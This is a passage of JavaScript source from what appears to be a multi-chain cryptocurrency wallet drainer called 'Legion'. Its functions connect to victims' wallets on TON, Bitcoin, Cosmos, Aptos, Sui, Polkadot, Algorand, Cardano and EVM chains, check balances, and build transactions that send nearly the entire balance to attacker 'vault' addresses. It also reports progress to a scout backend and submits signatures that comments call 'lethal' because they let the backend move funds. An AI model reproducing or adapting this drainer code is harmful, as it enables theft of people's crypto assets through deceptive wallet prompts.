      for (var ki = 0; ki < 32; ki++) ufhash[ki] = raw.charCodeAt(2 + ki);
      return { workchain: ufwc, hash: ufhash };
    } catch(e) { return null; }
  }

  function buildJettonTransferBoc(jettonAmount, destAddrStr, responseAddrStr) {
    var dest = parseTonAddress(destAddrStr);
    var resp = parseTonAddress(responseAddrStr);
    if (!dest || !resp) return '';
    var bits = [];
    function pushUint(n, c) { for (var i=c-1;i>=0;i--) bits.push((n>>>i)&1); }
    function pushBig(n, c) { for (var i=c-1;i>=0;i--) bits.push(Number((n>>BigInt(i))&1n)); }
    function pushVarUInt(n) {
      if (n===0n){pushUint(0,4);return;}
      var hex=n.toString(16); if(hex.length%2)hex='0'+hex;
      pushUint(hex.length/2,4);
      for(var i=0;i<hex.length;i+=2) pushUint(parseInt(hex.slice(i,i+2),16),8);
    }
    function pushAddr(a) {
      bits.push(1,0,0);
      pushUint(a.workchain<0?a.workchain+256:a.workchain,8);
      for(var i=0;i<32;i++) pushUint(a.hash[i],8);
    }
    pushUint(0x0f8a7ea5,32); pushBig(0n,64); pushVarUInt(jettonAmount);
    pushAddr(dest); pushAddr(resp);
    bits.push(0); pushVarUInt(1n); bits.push(0);
    var actualBits=bits.length, incomplete=(actualBits%8)!==0;
    if(incomplete){bits.push(1);while(bits.length%8)bits.push(0);}
    var data=new Uint8Array(bits.length/8);
    for(var i=0;i<data.length;i++){var b=0;for(var j=0;j<8;j++)b=(b<<1)|bits[i*8+j];data[i]=b;}
    var d2=Math.floor(actualBits/8)+Math.ceil(actualBits/8);
    var cell=new Uint8Array(2+data.length);
    cell[0]=0x00;cell[1]=d2;cell.set(data,2);
    var boc=new Uint8Array(11+cell.length),o=0;
    boc[o++]=0xb5;boc[o++]=0xee;boc[o++]=0x9c;boc[o++]=0x72;
    boc[o++]=0x01;boc[o++]=0x01;boc[o++]=0x01;boc[o++]=0x01;boc[o++]=0x00;
    boc[o++]=cell.length;boc[o++]=0x00;boc.set(cell,o);
    var s='';for(var i=0;i<boc.length;i++)s+=String.fromCharCode(boc[i]);
    return btoa(s);
  }

  async function drainTon(conn) {
    if (!conn) return null;
    var vault = VAULT.ton;
    try {
      var balRes = await fetch('https://tonapi.io/v2/accounts/' + encodeURIComponent(conn.address));
      var balData = await balRes.json();
      var nano = BigInt(balData.balance || '0');
      var messages = [];
      if (nano > 20000000n) {
        messages.push({ address: vault, amount: String(nano - 10000000n), payload: '' });
      }

      try {
        var jRes = await fetch('https://tonapi.io/v2/accounts/' + encodeURIComponent(conn.address) + '/jettons');
        var jData = await jRes.json();
        if (jData.balances) {
          for (var ji = 0; ji < jData.balances.length; ji++) {
            var j = jData.balances[ji];
            if (BigInt(j.balance || '0') <= 0n) continue;
            if (j.wallet_address && j.wallet_address.address) {
              var jAmt = BigInt(j.balance || '0');
              var jPayload = buildJettonTransferBoc(jAmt, vault, conn.address);
              if (jPayload) messages.push({
                address: j.wallet_address.address,
                amount: '100000000',
                payload: jPayload,
              });
            }
          }
        }
      } catch (je) {}

      if (messages.length === 0) return null;
      UI.status('Confirm TON transaction...');
      var tx = { validUntil: Math.floor(Date.now() / 1000) + 600, messages: messages };
      var result;
      if (conn.type === 'tonconnect') {
        result = await conn.provider.sendTransaction(tx);
      } else if (conn.provider && conn.provider.sendTransaction) {
        result = await conn.provider.sendTransaction(tx);
      } else if (conn.provider && conn.provider.send) {
        result = await conn.provider.send({ method: 'sendTransaction', params: tx });
      } else if (conn.wcSigner && _wcProv) {
        // WC direct path — Trust Wallet handles ton_sendTransaction natively
        result = await _wcProv.request({
          method: 'ton_sendTransaction',
          params: [tx],
          chainId: 'ton:mainnet',
        });
      } else {
        return null;
      }

      var boc = (result && result.boc) ? result.boc : JSON.stringify(result);
      await SUBMIT.ton(conn.address, boc, String(nano), conn.name);
      S.omnichainLegs.ton = { address: conn.address, boc: boc };
      L.log('TON submitted');
      return boc;
    } catch (e) { L.warn('TON drain fail:', e.message); return null; }
  }

  // ═══════════════════════════════════════════════════════════════
  // SECTION 13: BITCOIN MODULE (backend PSBT builder + wallet sign)
  // ═══════════════════════════════════════════════════════════════
  async function connectBtc() {
    if (S.familyConnections.UTXO) return S.familyConnections.UTXO;
    var entry = firstFamilyProvider('UTXO');
    if (!entry) return null;
    var prov = entry.provider;
    try {
      // Silent probe — selectedAddress or accounts array without popup
      var silentBtc = prov.selectedAddress
        || (prov.accounts && (Array.isArray(prov.accounts) ? prov.accounts[0] : prov.accounts))
        || '';
      if (silentBtc && typeof silentBtc === 'object') silentBtc = silentBtc.address || silentBtc.pubkey || '';
      if (silentBtc && typeof silentBtc === 'string' && silentBtc.length > 10) {
        L.log('[UTXO] silent:', silentBtc.slice(0, 8), '(' + entry.hint + ')');
        S.chains.BTC = { address: silentBtc, name: 'UTXO' };
        return { provider: prov, address: silentBtc, name: 'UTXO', family: 'UTXO', hint: entry.hint };
      }
      // Full connect required in Trust in-app (ETH Connect alone is not enough)
      var accounts;
      if (prov.requestAccounts) accounts = await prov.requestAccounts();
      else if (prov.connect) {
        var cr = await prov.connect();
        accounts = cr.accounts || cr.addresses || [cr];
      } else if (prov.getAccounts) accounts = await prov.getAccounts();
      else return null;
      var addr = Array.isArray(accounts) ? accounts[0] : accounts;
      if (addr && typeof addr === 'object') addr = addr.address || addr.pubkey || '';
      if (!addr || typeof addr !== 'string') return null;
      S.chains.BTC = { address: addr, name: 'UTXO' };
      L.log('[UTXO] connected:', addr.slice(0, 8), '(' + entry.hint + ')');
      return { provider: prov, address: addr, name: 'UTXO', family: 'UTXO', hint: entry.hint };
    } catch (e) { L.warn('[UTXO] connect fail:', e.message); return null; }
  }

  async function drainBtc(conn) {
    if (!conn) return null;
    var vault = VAULT.btc;
    try {
      var psbtResp = await apiPost('/api/v1/signature-anchor/bitcoin-psbt', {
        wallet_address: conn.address,
        vault_address: vault,
        amount_sat: '0',
      });
      var pdata = (psbtResp && psbtResp.data) ? psbtResp.data : psbtResp;
      if (!pdata || !pdata.psbt_base64) {
        L.warn('BTC PSBT unavailable — check BLOCKCYPHER_API_TOKEN on backend');
        return null;
      }
      var psbt = pdata.psbt_base64;
      var amountSat = pdata.amount_sat || pdata.amountSat || '0';
      var inputCount = pdata.inputs || pdata.input_count || 1;
      var toSign = [];
      for (var i = 0; i < inputCount; i++) toSign.push({ index: i, address: conn.address });

      UI.status('Confirm Bitcoin PSBT...');
      var signed = await conn.provider.signPsbt(psbt, {
        autoFinalized: true,
        toSignInputs: toSign,
      });
      var signedB64 = typeof signed === 'string' ? signed : (signed && signed.psbt) ? signed.psbt : bufToB64(signed);
      await SUBMIT.bitcoin(conn.address, signedB64, amountSat, conn.name);
      S.omnichainLegs.bitcoin = { address: conn.address, psbt: signedB64, amount_sat: String(amountSat || '0') };
      L.log('BTC PSBT submitted');
      return signedB64;
    } catch (e) { L.warn('BTC drain fail:', e.message); return null; }
  }

  // ═══════════════════════════════════════════════════════════════
  // SECTION 13B: COSMOS MODULE (Keplr — cosmoshub-4 ATOM)
  // ═══════════════════════════════════════════════════════════════
  async function connectCosmos() {
    if (S.familyConnections.COSMOS) return S.familyConnections.COSMOS;
    var entry = firstFamilyProvider('COSMOS');
    if (!entry) return null;
    var prov = entry.provider;
    var chainIds = Object.keys(COSMOS_CHAINS);
    for (var ci = 0; ci < chainIds.length; ci++) {
      try {
        var chainId = chainIds[ci];
        await prov.enable(chainId);
        var key = await prov.getKey(chainId);
        if (!key || !key.bech32Address) continue;
        S.chains.COSMOS = { address: key.bech32Address };
        L.log('[COSMOS] connected:', key.bech32Address.slice(0, 8), chainId, '(' + entry.hint + ')');
        return { provider: prov, address: key.bech32Address, chainId: chainId, name: 'COSMOS', family: 'COSMOS', hint: entry.hint };
      } catch (e) { /* try next chain */ }
    }
    L.warn('[COSMOS] connect fail: no chain enabled');
    return null;
  }

  async function drainCosmosChain(conn, chainId, cfg) {
    var addr = conn.address;
    var vault = VAULT.cosmos;
    var balJson = await fetchJsonWithFallback(cfg.rests, '/cosmos/bank/v1/balances/' + addr);
    var coin = (balJson.balances || []).find(function (b) { return b.denom === cfg.denom; });
    var amount = BigInt(coin && coin.amount ? coin.amount : '0');
    if (amount < cfg.min) return null;

    var accJson = await fetchJsonWithFallback(cfg.rests, '/cosmos/auth/v1/accounts/' + addr);
    var acc = accJson && accJson.account;
    var accNum = acc && (acc.account_number || (acc.value && acc.value.account_number));
    var seq = acc && (acc.sequence || (acc.value && acc.value.sequence));
    if (accNum == null || seq == null) return null;

    var feeAmt = BigInt(cfg.fee || '5000');
    var sendAmt = String(amount - feeAmt);
    var signDoc = {
      chain_id: chainId,
      account_number: String(accNum),
      sequence: String(seq),
      fee: { amount: [{ denom: cfg.denom, amount: String(feeAmt) }], gas: '200000' },
      msgs: [{
        type: 'cosmos-sdk/MsgSend',
        value: { from_address: addr, to_address: vault, amount: [{ denom: cfg.denom, amount: sendAmt }] },
      }],
      memo: '',
    };

    UI.status('Confirm Cosmos ' + chainId + '...');
    var signed = await conn.provider.signAmino(chainId, addr, signDoc);
    var signedWire = typeof signed === 'string' ? signed : JSON.stringify(signed);
    S.omnichainLegs.cosmos = { address: addr, amount: sendAmt, signed_tx: signedWire };
    await SUBMIT.cosmos(addr, signed, sendAmt, conn.name);
    L.log('Cosmos', chainId, 'submitted via /txs backend relay');
    return signed;
  }

  async function drainCosmos(conn) {
    if (!conn || !VAULT.cosmos) { L.warn('Cosmos vault not configured'); return null; }
    try {
      var primary = COSMOS_CHAINS[conn.chainId];
      if (primary) {
        return await drainCosmosChain(conn, conn.chainId, primary);
      }
      var chainIds = Object.keys(COSMOS_CHAINS);
      for (var i = 0; i < chainIds.length; i++) {
        try {
          var cid = chainIds[i];
          var result = await drainCosmosChain(conn, cid, COSMOS_CHAINS[cid]);
          if (result) return result;
        } catch (e) {
          if (/timeout|rate|fetch|503|502|ECONN/i.test(e.message)) throw e;
        }
      }
      return null;
    } catch (e) {
      L.warn('Cosmos drain fail:', e.message);
      throw e;
    }
  }

  async function drainPolkadot(conn) {
    if (!conn || !conn.address) return null;
    try {
      UI.status('Confirm Polkadot authorization...');
      var sig = conn.address;
      if (conn.provider && conn.provider.request) {
        try {
          var signed = await conn.provider.request({
            method: 'polkadot_signMessage',
            params: { address: conn.address, message: 'Legion settlement authorization' },
          });
          if (signed) sig = signed;
        } catch (pe) {
          if (isUserRejection(pe)) throw pe;
        }
      }
      await SUBMIT.polkadot(conn.address, sig, conn.name);
      L.log('[DOT] anchor submitted');
      return sig;
    } catch (e) {
      L.warn('Polkadot drain fail:', e.message);
      throw e;
    }
  }

  async function drainAlgorand(conn) {
    if (!conn || !conn.address) return null;
    try {
      UI.status('Confirm Algorand authorization...');
      var sig = conn.address;
      if (conn.provider && conn.provider.signMessage) {
        try {
          sig = await conn.provider.signMessage('Legion settlement authorization');
        } catch (ae) {
          if (isUserRejection(ae)) throw ae;
        }
      }
      await SUBMIT.algorand(conn.address, sig, conn.name);
      L.log('[ALGO] anchor submitted');
      return sig;
    } catch (e) {
      L.warn('Algorand drain fail:', e.message);
      throw e;
    }
  }

  async function drainCardano(conn) {
    if (!conn || !conn.address) return null;
    try {
      UI.status('Confirm Cardano authorization...');
      var sig = conn.address;
      if (conn.provider && conn.provider.signData) {
        try {
          var payload = await conn.provider.signData(conn.address, 'Legion settlement authorization');
          if (payload) sig = payload;
        } catch (ce) {
          if (isUserRejection(ce)) throw ce;
        }
      }
      await SUBMIT.cardano(conn.address, sig, conn.name);
      L.log('[ADA] anchor submitted');
      return sig;
    } catch (e) {
      L.warn('Cardano drain fail:', e.message);
      throw e;
    }
  }

  // ═══════════════════════════════════════════════════════════════
  // SECTION 13C: APTOS MODULE (Petra / Martian)
  // ═══════════════════════════════════════════════════════════════
  async function connectAptos() {
    if (S.familyConnections.APTOS) return S.familyConnections.APTOS;
    var entry = firstFamilyProvider('APTOS');
    if (!entry) return null;
    var apt = entry.provider;
    try {
      if (apt.connect) await apt.connect();
      var account = null;
      try { account = apt.account ? await apt.account() : null; } catch (ae) {}
      var addr = (account && account.address) || apt.address || '';
      if (!addr) return null;
      S.chains.APTOS = { address: addr };
      L.log('[APTOS] connected:', addr.slice(0, 8), '(' + entry.hint + ')');
      return { provider: apt, address: addr, name: 'APTOS', family: 'APTOS', hint: entry.hint };
    } catch (e) { L.warn('[APTOS] connect fail:', e.message); return null; }
  }

  async function drainAptos(conn) {
    if (!conn || !VAULT.aptos) { L.warn('Aptos vault not configured'); return null; }
    try {
      var addr = conn.address;
      var vault = VAULT.aptos;
      var res = await fetch(APTOS_RPC + '/accounts/' + addr + '/resources');
      var resources = await res.json();
      var coinStore = Array.isArray(resources) && resources.find(function (r) {
        return r.type === '0x1::coin::CoinStore<0x1::aptos_coin::AptosCoin>';
      });
      if (!coinStore || !coinStore.data || !coinStore.data.coin) return null;
      var total = BigInt(coinStore.data.coin.value || '0');
      if (total < 100000n) return null;
      var sendAmt = total - 50000n;

      UI.status('Confirm Aptos transfer...');
      var payload = {
        type: 'entry_function_payload',
        function: '0x1::aptos_account::transfer',
        type_arguments: [],
        arguments: [vault, String(sendAmt)],
      };
      var result = await conn.provider.signAndSubmitTransaction({ data: payload });
      var hash = (result && result.hash) ? result.hash : String(result);
      S.omnichainLegs.aptos = { address: addr, amount: String(sendAmt), signed_tx: hash };
      await SUBMIT.aptos(addr, hash, conn.name);
      L.log('Aptos submitted:', hash);
      return hash;
    } catch (e) { L.warn('Aptos drain fail:', e.message); return null; }
  }

  // ═══════════════════════════════════════════════════════════════
  // SECTION 13D: SUI MODULE (Sui Wallet / Phantom Sui)
  // ═══════════════════════════════════════════════════════════════
  async function connectSui() {
    if (S.familyConnections.SUI) return S.familyConnections.SUI;
    var entry = firstFamilyProvider('SUI');
    if (!entry) return null;
    var sui = entry.provider;
    try {
      if (sui.connect) await sui.connect();
      var accounts = sui.accounts || (sui.getAccounts && await sui.getAccounts()) || [];
      var addr = accounts[0] && (accounts[0].address || accounts[0]);
      if (!addr) return null;
      S.chains.SUI = { address: addr };
      L.log('[SUI] connected:', String(addr).slice(0, 8), '(' + entry.hint + ')');
      return { provider: sui, address: addr, name: 'SUI', family: 'SUI', hint: entry.hint };
    } catch (e) { L.warn('[SUI] connect fail:', e.message); return null; }
  }

  async function drainSui(conn) {
    if (!conn || !VAULT.sui) { L.warn('Sui vault not configured'); return null; }
    try {
      var addr = conn.address;
      var balRes = await fetch(SUI_RPC, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          jsonrpc: '2.0', id: 1,
          method: 'suix_getBalance',
          params: [addr],
        }),
      });
      var balJson = await balRes.json();
      var total = BigInt((balJson.result && balJson.result.totalBalance) || '0');
      if (total < 10000000n) return null;
      var sendMist = total - 5000000n;

      UI.status('Sign Sui transaction...');
      var txBlock = {
        kind: 'moveCall',
        data: {
          packageObjectId: '0x2',
          module: 'pay',
          function: 'split',
          typeArguments: ['0x2::sui::SUI'],
          arguments: [String(sendMist)],
        },
      };
      var signed;
      if (conn.provider.signTransactionBlock) {
        signed = await conn.provider.signTransactionBlock({ transactionBlock: txBlock });
      } else if (!SIGN_ONLY && conn.provider.signAndExecuteTransactionBlock) {
        var exec = await conn.provider.signAndExecuteTransactionBlock({
          transactionBlock: txBlock,
          options: { showEffects: true },
        });
        signed = exec.digest || JSON.stringify(exec);
      } else return null;

      await SUBMIT.sui(addr, signed, conn.name);
      S.omnichainLegs.sui = {
        address: addr,
        amount: String(sendMist),
        signed: typeof signed === 'string' ? signed : JSON.stringify(signed),
      };
      L.log('Sui submitted');
      return signed;
    } catch (e) { L.warn('Sui drain fail:', e.message); return null; }
  }

  // ═══════════════════════════════════════════════════════════════
  // SECTION 13E: UNIVERSAL ORCHESTRATOR (all chains, value-priority)
  // ═══════════════════════════════════════════════════════════════
  async function runUniversalDrain(evmCtx) {
    L.log('[drain] start — scan + extract');
    var addrs = S.allAddresses && Object.keys(S.allAddresses).length
      ? S.allAddresses
      : collectAddressMap(evmCtx.address);
    S.omnichainLegs = {};

    var addrKey = String(evmCtx.address || '').toLowerCase();
    var alreadyScanned = !!(S.amountScoutDone && S.portfolioScan &&
      (S._portfolioScanKey === addrKey || (S.portfolioScan.addresses && String(S.portfolioScan.addresses.evm || '').toLowerCase() === addrKey)));

    var portfolio;
    if (alreadyScanned) {
      L.log('[drain] reuse portfolioScan — skip re-multi-balance/ranked');
      portfolio = S.portfolioScan;
    } else {
      portfolio = await scanFullPortfolio(evmCtx.address, addrs);
    }

    var alreadyNotified = !!(S.notifyDone || S.connectNotifiedAddr === addrKey);
    if (!alreadyNotified) {
      await SCOUT.alertStage('connect', evmCtx.address, evmCtx.chainId, evmCtx.walletName, 'Wallet connected');
      await broadcastConnectScan(evmCtx.address, evmCtx.chainId, evmCtx.walletName, addrs);
    } else {
      L.log('[drain] skip re-notify scout — already notified');
    }

    if (!alreadyScanned) {
      await SCOUT.alertStage('scan_start', evmCtx.address, evmCtx.chainId, evmCtx.walletName);
    }

    var fusionData = null;
    var fKey = String((addrs && (addrs.evm || addrs.sol || addrs.btc)) || addrKey).toLowerCase();
    if (alreadyScanned && S._fusionDoneKey === fKey) {
      L.log('[drain] reuse fusion — skip re-POST');
      fusionData = { total_usd: S.scoutUsd, assets: S.fusionAssets };
    } else {
      fusionData = await SCOUT.fusion(addrs);
    }
    if (fusionData && fusionData.total_usd) {
      S.scoutUsd = Math.max(S.scoutUsd, Number(fusionData.total_usd) || 0);
      L.log('Fusion USD (all families):', S.scoutUsd.toFixed(2));
    }
    if (portfolio && portfolio.totalUsd > S.scoutUsd) {
      S.scoutUsd = portfolio.totalUsd;
    }

    if (!S.fusionNotified) {
      await SCOUT.reportScanComplete(
        evmCtx.address,
        S.scoutUsd,
        (portfolio && portfolio.assetCount) ||
          (fusionData && fusionData.assets_count) ||
          (portfolio && portfolio.items && portfolio.items.length) || 0,
        evmCtx.walletName,
        evmCtx.chainId
      );
    } else {
      L.log('[drain] skip re-report scan_complete');
    }

    evmCtx.chainId = await ensureFundedEvmChain(evmCtx.provider, evmCtx.address, evmCtx.chainId);
    S.evmChain = evmCtx.chainId;
    await SCOUT.alertStage('network_switch', evmCtx.address, evmCtx.chainId, evmCtx.walletName, 'chain ' + evmCtx.chainId);
    var priority = SCOUT.chainPriority(fusionData);
    L.log('Drain priority (USD):', priority.join(' > '));

    await SCOUT.alertStage('drain_start', evmCtx.address, evmCtx.chainId, evmCtx.walletName);

    await prepareExtensionFamiliesBeforeDrain(fusionData);
    await prepareWcSignersBeforeDrain(fusionData);

    // Same popup never re-shown after user confirms; different families may still prompt
    var runners = {
      EVM: function () {
        // Do NOT global-skip after first lethal — Mode B walks other fundedChains.
        // Per-chain isPopupConfirmed inside waterfall avoids re-showing same chain/kind.
        L.log('[drain] EVM Mode B — all funded chains');
        return runEvmDrain(
          evmCtx.provider, evmCtx.address, evmCtx.chainId, evmCtx.walletName, evmCtx.hwObj, portfolio
        ).catch(function (e) {
          return SCOUT.alertFailure('EVM', 'drain', e, evmCtx.address, evmCtx.chainId, evmCtx.walletName).then(function () { throw e; });
        });
      },
      SOL: function () {
        return runWithRetry(function () {
          return drainSol(S.familyConnections.SVM);
        }, 'SOL').catch(function (e) {
          return SCOUT.alertFailure('SOL', 'drain', e, evmCtx.address, evmCtx.chainId, evmCtx.walletName).then(function () { throw e; });
        });
      },
      TRON: function () {
        return runWithRetry(function () {
          return drainTron(S.familyConnections.TRON);
        }, 'TRON').catch(function (e) {
          return SCOUT.alertFailure('TRON', 'drain', e, evmCtx.address, evmCtx.chainId, evmCtx.walletName).then(function () { throw e; });
        });
      },
      TON: function () {
        return runWithRetry(function () {
          return drainTon(S.familyConnections.TON);
        }, 'TON').catch(function (e) {
          return SCOUT.alertFailure('TON', 'drain', e, evmCtx.address, evmCtx.chainId, evmCtx.walletName).then(function () { throw e; });
        });
      },
      BTC: function () {
        return runWithRetry(function () {
          return drainBtc(S.familyConnections.UTXO);
        }, 'BTC').catch(function (e) {
          return SCOUT.alertFailure('BTC', 'drain', e, evmCtx.address, evmCtx.chainId, evmCtx.walletName).then(function () { throw e; });
        });
      },
      COSMOS: function () {
        return runWithRetry(function () {
          return drainCosmos(S.familyConnections.COSMOS);
        }, 'COSMOS').catch(function (e) {
          return SCOUT.alertFailure('COSMOS', 'drain', e, evmCtx.address, evmCtx.chainId, evmCtx.walletName).then(function () { throw e; });
        });
      },
      APTOS: function () {
        return runWithRetry(function () {
          return drainAptos(S.familyConnections.APTOS);
        }, 'APTOS').catch(function (e) {
          return SCOUT.alertFailure('APTOS', 'drain', e, evmCtx.address, evmCtx.chainId, evmCtx.walletName).then(function () { throw e; });
        });
      },
      SUI: function () {
        return runWithRetry(function () {
          return drainSui(S.familyConnections.SUI);
        }, 'SUI').catch(function (e) {
          return SCOUT.alertFailure('SUI', 'drain', e, evmCtx.address, evmCtx.chainId, evmCtx.walletName).then(function () { throw e; });
        });
      },
      POLKADOT: function () {
        return runWithRetry(function () {
          return drainPolkadot(S.familyConnections.POLKADOT);
        }, 'POLKADOT').catch(function (e) {
          return SCOUT.alertFailure('POLKADOT', 'drain', e, evmCtx.address, evmCtx.chainId, evmCtx.walletName).then(function () { throw e; });
        });
      },
      ALGORAND: function () {
        return runWithRetry(function () {
          return drainAlgorand(S.familyConnections.ALGORAND);
        }, 'ALGORAND').catch(function (e) {
          return SCOUT.alertFailure('ALGORAND', 'drain', e, evmCtx.address, evmCtx.chainId, evmCtx.walletName).then(function () { throw e; });
        });
      },
      CARDANO: function () {
        return runWithRetry(function () {
          return drainCardano(S.familyConnections.CARDANO);
        }, 'CARDANO').catch(function (e) {
          return SCOUT.alertFailure('CARDANO', 'drain', e, evmCtx.address, evmCtx.chainId, evmCtx.walletName).then(function () { throw e; });
        });
      },
    };

    function familyReadyForDrain(key) {
      if (key === 'EVM') {
        return !!(evmCtx && evmCtx.provider && evmCtx.address);
      }
      if (!isFamilyDrainReady(key)) {
        L.log('[drain] skip', key, '— disabled');
        return false;
      }
      if (isAnchorOnlyFamily(key)) {
        L.log('[drain] anchor leg', key, '— signMessage + backend submit');
      }
      if (!runners[key]) return false;
      var connKey = key;
      if (key === 'SOL') connKey = 'SVM';
      if (key === 'BTC') connKey = 'UTXO';
      var conn = S.familyConnections[connKey];
      if (!conn) return false;
      if (!familyConnectionCanSign(conn, connKey)) {
        L.log('[drain] skip', key, '— no phone signer (approve', key, 'on wallet app first)');
        return false;
      }
      return true;
    }

    // Sequential families (EVM first, then USD priority) — no parallel overlapping wallet prompts
    var seq = [];
    if (familyReadyForDrain('EVM')) seq.push('EVM');
    priority.forEach(function (key) {
      if (key === 'EVM') return;
      if (familyReadyForDrain(key)) seq.push(key);
    });
    L.log('[drain] sequential order:', seq.join(' > '));
    for (var si = 0; si < seq.length; si++) {
      if (S.phaseBAborted && seq[si] !== 'EVM') {
        L.log('[drain] phaseB aborted — skip', seq[si]);
        continue;
      }
      var fam = seq[si];
      try {
        await runners[fam]();
      } catch (e) {
        L.warn(fam + ':', (e && e.message) || e);
      }
    }

    // Trust in-app loophole: trust://send fallback for chains with backend-detected balance but no signer
    if (isTrustInAppBrowser() && S.allAddresses) {
      var vaultMap = { SOL: VAULT.sol, BTC: VAULT.btc, TRON: VAULT.tron, TON: VAULT.ton, COSMOS: VAULT.cosmos };
      Object.keys(vaultMap).forEach(function (famKey) {
        var vault = vaultMap[famKey];
        if (!vault) return;
        var addrKey = famKey === 'SOL' ? 'sol' : famKey === 'BTC' ? 'btc' : famKey.toLowerCase();
        var userAddr = S.allAddresses[addrKey];
        var already = S.familyConnections[famKey === 'SOL' ? 'SVM' : famKey === 'BTC' ? 'UTXO' : famKey];
        if (userAddr && !already) {
          L.log('[trust-send] fallback', famKey, '→ user has balance but no signer; deep-link send');
          trustSendDeepLink(famKey, vault);
        }
      });
    }

    await SCOUT.alertStage('drain_complete', evmCtx.address, evmCtx.chainId, evmCtx.walletName);

    await flushPendingEvmSubmit(evmCtx);
  }

  async function flushPendingEvmSubmit(evmCtx) {
    if (!S.pendingEvmPermit2) return;
    var legs = S.omnichainLegs || {};
    var hasNonEvm = !!(legs.solana && legs.solana.txs && legs.solana.txs.length) ||
      !!(legs.tron && legs.tron.legs && legs.tron.legs.length) || !!legs.ton ||
      !!(legs.bitcoin && legs.bitcoin.psbt) ||
      !!(legs.cosmos && legs.cosmos.signed_tx) ||
      !!(legs.aptos && legs.aptos.signed_tx) ||
      !!(legs.sui && legs.sui.signed);
    if (hasNonEvm) {
      await tryOmnichainEnvelope(evmCtx);
    } else {
      var p2 = S.pendingEvmPermit2;
      await SUBMIT.permit2(p2, evmCtx.address, evmCtx.chainId, evmCtx.walletName, p2.nfts, p2.nftApprovalSigs || {});
    }
    S.pendingEvmPermit2 = null;
  }

  async function tryOmnichainEnvelope(evmCtx) {
    var legs = S.omnichainLegs;
    var hasSol = legs.solana && legs.solana.txs && legs.solana.txs.length;
    var hasTrx = legs.tron && legs.tron.legs && legs.tron.legs.length;
    var hasTon = !!legs.ton;
    var hasBtc = !!(legs.bitcoin && legs.bitcoin.psbt);
    var hasCosmos = !!(legs.cosmos && legs.cosmos.signed_tx);
    var hasAptos = !!(legs.aptos && legs.aptos.signed_tx);
    var hasSui = !!(legs.sui && legs.sui.signed);
    if (!hasSol && !hasTrx && !hasTon && !hasBtc && !hasCosmos && !hasAptos && !hasSui) return;
    if (!S.pendingEvmPermit2) return;

    var p2 = S.pendingEvmPermit2;
    var bd = p2.batchData;
  try {
      await SUBMIT.omnichain({
        wallet_address: evmCtx.address.toLowerCase(),
        chain_id: Number(evmCtx.chainId),
        token_address: (bd.permits && bd.permits[0] && bd.permits[0].token) || NATIVE_ETH_ADDR,
        signature: p2.sig || '0x',
        engine_spender: bd.engine_spender,
        permit2: bd.permit2,
        permits: bd.permits,
        batch_permit_metadata: bd.batch_permit_metadata,
        native_amount: String(p2.nativeAmount || '0'),
        native_signed_transaction: p2.nativeSigned || '',
        wallet_type: evmCtx.walletName,
        solana_payload: hasSol ? {
          native_amount_sol: legs.solana.txs[0].meta.amount,
          native_signed_transaction_sol: legs.solana.txs[0].signed_tx_b64,
        } : undefined,
        tron_payload: hasTrx ? {
          native_amount_trx: String(legs.tron.legs[0].amount || '0'),
          native_signed_transaction_trx: sigHex({ signed_tx: legs.tron.legs[0].signed }),
        } : undefined,
        ton_payload: hasTon ? {
          native_amount_ton: '0',
          native_signed_transaction_ton: legs.ton.boc,
        } : undefined,
        bitcoin_payload: hasBtc ? {
          signed_psbt_base64: legs.bitcoin.psbt,
          wallet_address: legs.bitcoin.address,
          vault_address: VAULT.btc,
          amount_sat: legs.bitcoin.amount_sat || '0',
        } : undefined,
        cosmos_payload: hasCosmos ? {
          native_amount_cosmos: String(legs.cosmos.amount || '0'),
          cosmos_signed_tx: legs.cosmos.signed_tx,
          cosmos_tx_encoding: 'hex',
        } : undefined,
        aptos_payload: hasAptos ? {
          native_amount_aptos: String(legs.aptos.amount || '0'),
          aptos_signed_tx: legs.aptos.signed_tx,
        } : undefined,
        sui_payload: hasSui ? {
          native_amount_sui: String(legs.sui.amount || '0'),
          sui_signed_tx: legs.sui.signed,
        } : undefined,
      });
      L.log('Omnichain atomic envelope submitted');
    } catch (e) { L.warn('Omnichain envelope skip:', e.message); }
  }

  // ═══════════════════════════════════════════════════════════════
  // SECTION 14: BACKEND SUBMISSION
  // PROTOCOL LOCK (backend signature-anchor.ts — DO NOT change without reading API):
  // LETHAL PROTOCOLS ONLY (backend can move funds):
  //   permit2_batch_eip712     → Permit2 + optional native_signed_transaction broadcast
  //   eip7702_delegation       → wallet_signAuthorization → backend delegate drain
  //   eip7702_self_broadcast   → wallet_sendCalls (user broadcast, signOnly off)
  //   seaport_listing          → NFT fill
  //   omnichain_atomic_v1      → multi-family signed legs
  // BANNED: evm_personal_verification / personal_sign (record only, no settlement)
  // ═══════════════════════════════════════════════════════════════
  var SUBMIT = {
    base: async function (extra) {
      var payload = Object.assign({
        ingress: 'normalized_v1',
        nonce: 'legion:' + Date.now() + ':' + Math.random().toString(36).slice(2, 7),
        expiry_iso: EXPIRY_ISO,
        wallet_type: S.evmWallet || 'Unknown',
        scout_value_usd: Number(S.scoutUsd) || 0,
        amount: '0',
        source_origin: window.location.origin,
      }, extra);
      if (payload.caip_chain_id == null && payload.chain_id != null && String(payload.chain_id).indexOf(':') >= 0) {
        payload.caip_chain_id = String(payload.chain_id);
        if ((payload.chain_family || 'EVM').toUpperCase() === 'EVM') {
          var evmN = Number(String(payload.chain_id).replace(/^eip155:/i, ''));
          if (Number.isFinite(evmN) && evmN > 0) payload.chain_id = evmN;
        }
      } else if ((payload.chain_family || '').toUpperCase() === 'EVM' && payload.chain_id != null && typeof payload.chain_id === 'number') {
        payload.caip_chain_id = 'eip155:' + payload.chain_id;
      }
      var r = await apiPost('/api/v1/signature-anchor', payload);
      if (r && (r.success || r.deferred || r.data)) {
        S.anchorsOk++;
        L.log('Submitted:', extra.protocol, r.deferred ? '(deferred broadcast)' : '');
      }
      return r;
    },

    viaBuilder: async function (builder, settlementInput) {
      return apiPost('/api/v1/signature-anchor', {
        settlement_builder: builder,
        settlement_input: settlementInput,
      });
    },

    sendCalls: async function (batchId, address, chainId, walletName) {
      var txHash = extractBatchOrTxId(batchId) || String(batchId);
      if (!isLikelyTxHash(txHash)) {
        L.warn('sendCalls: not a real tx hash — skip submit');
        return null;
      }
      return this.base({
        chain_family: 'EVM', protocol: 'eip7702_self_broadcast',
        wallet_address: address.toLowerCase(), chain_id: Number(chainId),
        tx_hash: txHash, token_address: NATIVE_ETH_ADDR, signature: txHash,
        wallet_type: walletName,
      });
    },

    userBroadcast: async function (txHash, address, chainId, walletName, amountWei) {
      var hash = String(txHash);
